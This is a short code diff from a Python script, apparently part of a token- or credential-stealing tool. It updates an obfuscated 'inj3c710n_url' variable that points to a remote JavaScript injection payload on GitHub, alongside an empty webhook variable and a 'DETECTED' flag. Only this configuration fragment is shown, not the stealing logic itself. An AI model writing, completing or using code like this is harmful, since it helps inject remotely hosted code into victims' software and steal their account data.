@@ -208,7 +208,7 @@ def mac_check():
 
 
 hook = ""
-inj3c710n_url = "https://raw.githubusercontent.com/PrimeInj/Injection/main/index.js"
+inj3c710n_url = "https://raw.githubusercontent.com/PrimeInj/injection/main/index.js"
 color =  0x00000000
 DETECTED = False
 
